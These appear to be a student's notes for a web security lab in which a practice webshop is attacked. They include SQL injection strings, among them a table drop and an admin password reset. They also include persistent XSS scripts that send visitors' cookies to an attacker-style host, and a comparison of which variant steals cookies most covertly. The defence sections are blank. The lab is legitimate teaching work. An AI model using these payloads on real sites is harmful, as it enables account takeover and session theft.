# Lab, Advanced Web Security

# Preparatory assignments

## Preparatory assignment 1
If one enters something like `user" or 1=2` in the username field, an error message is given.
This makes the SQL query FALSE.
What one could accomplish with this could possibly be to:
* dump list of users (username field: `" OR 1=1 --`)
* login without giving password (u: `[USERNAME] --` or same u, p: `" or 1=1`)
* drop database tables or executing other arbitrary queries (`[WHATEVER] ; DROP TABLE Users`)

## Preparatory assignment 2
The code forms a SQL query with an input `username`. 
The query retrieves the password from the database for the user w/ username `username`.
The retrieved password is compared with the `old` password entered by the user.
If the passwords do not match, "Incorrect password" is echo'ed and the script is exited.
If they do match, a new SQL query is formed that updates the password entry in the database
for the user w/ username `username` with the new password given by the user,
and echoes "Password changed successfully".
With both SQL queries, they are checked to see if they are valid,
otherwise it is echo'ed that the "query: [echo query verbatim] failed".

* "The `die()` function prints a message and exits the current script"

---

## Preparatory assignment 3
* Basics of XSS attacks, especially persistent XSS attacks
* Write two javascripts
	* test for XSS vulnerabilities
		`<?php passthru('ls'); ?>` ..but JavaScript..
		* `<script>alert("xss? xss!")</script>`
	* steal a user's cookie
		* `<script>document.location='http://malicious-site.evil/steal.php?cookie='`
		`+ document.cookie; alert("U hav bin pwn3d!!!!1!");</script>`
		*(Note: alert optional, depending on desired effect.)*

## Preparatory assignment 4
* Get knowledge about FireBug, especially how to edit cookies w/ it

## Preparatory assignment 5
* Read up on ModSecurity

---

# Problems

## Problem 1
* Vulnerability scanning
(Based on a user with u: `user` and p: `pass` is registered.)
	* Login: If one enters something like `user" or 1=2` in the username field, 
	an error message is given. This makes the SQL query FALSE.

	* Login: Entering `" or 1=1` in both username and password field, an error is given. 
	Here also ` LIMIT 1` is appended to the query.
	
	* Login: Entering `1" or "1"="1` in both u and p fields, login page says:
	"Something went wrong with your authentication attempt"

* Attack vectors
	* Firstly, we see that the query uses quotes: "

---

## Problem 2
* Fill table of different usernames and queries
Had to do this with `[USERNAME]" and "1"="1`, i. e. quotes

* [username]
	* TRUE		
	* FALSE
* user		
	* `user" or "1"="1` => "Something went wrong with your authentication attempt"
	* `user" AND 1=1#` => "Something went wrong with your authentication attempt"
	* "Username user" AND 1=2# or password is unknown"
* nobody
	* "Username nobody" AND 1=1# or password is unknown"
	* "Username nobody" AND 1=2# or password is unknown"
	So, if username does not exist TRUE and FALSE statements give same msg.
	If username exists, TRUE statement gives different msg.
(Note: from here I will just write of acc exists)
* root
	* No.
* administrator
	* No.
* admin
	* *--Yes!--*
* superuser
	* No.

The error msgs could differ for several reasons, but a likely one is that
a programmer thought this would be a nice feature for an existing user 
to have.

---

## Problem 3
* It does not work. Why?
* Try to get access w/o password:
	* `admin" OR "user` w/ user's password does not work.
	* Could theoretically do ; and add a query, but since quotes are added around
	values, this is hard to do.
* Access to admin acc w/o password?
	* Abuse change password feature?

## Problem 4
* Failing when old=[OLD] and new= `" ;`
	* output: `query: UPDATE users SET password="" ;" WHERE username="2" failed` 
* Working injection: `adminpass" WHERE username="admin" #` 
* **Logged in!**

## Problem 5
* Abilities of admin account vs normal account
	* Can add new items
	* Can remove all items

* Attack vectors
	* Can probably do persistent XSS

---

## Problem 6
* XSS vulnerability: adding items to shop as admin
	* Used script from prep-ass. 3. 
	Output: `Query: INSERT INTO items SET name="xsstest;`
	* Used `<script>alert("xss")</script>`
	Got an alert!
	Output: `Query: INSERT INTO items SET name="" failed`
	This does not, however, matter since the vulnerability was proved.
	..Actually, that was just a vector for reflective XSS, not persistent.
	* Next try: `xss <script>alert('xss')</script>`
	This worked. An `xss` element was added to Shop,
	and when Shop page is accessed the alert is triggered.
	Persistent. Nice.
* Modified script/entry to Shop page:
	`it's a steal! <script>document.location='http://localhost2/index.php?cookie='
	` + document.cookie</script>`
	Had to remove semicolon because that would end SQL query.
* The script works by changing location of the DOM to our malicious site.
That site's php script saves the cookie attached in the GET request, to
a file named log.txt. It then changes the header to the referer,
in this case the webshop site.
This does not result in any noteworthy stealthiness, especially
since the two sites keep referring to eachother, throwing the
user agent back and forth like a quick game of Pong.
The user has a hard time clicking anything because of these.
Even as attacker, to remove the item one had to actively stop
loading the site, and then click the Delete All button.

---

## Problem 7
* Explanation of scripts:
	* The first one is explained in Prob. 6.
	* The second is a link (\<a> element) that refers to google.com,
	but at mouseover executes the same Javascript as the first variant.
	* The third instantiates an Image, w/ the source same as the 
	first two variants refer to. The difference here is that
	this will neither put user in an eternal loop or require 
	interaction w/ the element from the user, but execute unseen.
	Thus, stealthiness.
* Which works best?
	* Partial explanation in bullet point above.
	* Circumstances:
		* 1: If there is no need to be covert,
		or if not being covert is the desired effect.
		E. g. letting somebody know you have control over
		at least part of their system to scare or blackmail
		them. Or attacking an automatic system of some sort.
		* 2: Could be useful if one wants to e. g. target 
		a specific user, use a little social engineering
		and trick a special user into clicking something
		but not every user that visits the site.
		* 3: If covertness is of importance.
		If one wants to collect cookies from every user,
		for e. g. scanning for email-(password?) combinations 
		used, credit card details, etc.

---

## Problem 8
* Can browse site unhindered, from what I can tell.
* What would happen? Perhaps the sessions would "cancel out" eachother?
Or both sessions would get the same requests, same thing would happen on both?
	* Tried to test this, but the version of Firefox installed in the VM
	is 17.0, so there is no private mode. This could be used because 
	a private window runs on a separate process from 'regular' windows,
	which all run on the same process. Thus, moot.
	* So, not sure of what would happen.

---

# Defending!

## Problem 9


## Problem 10
## Problem 11
## Problem 12
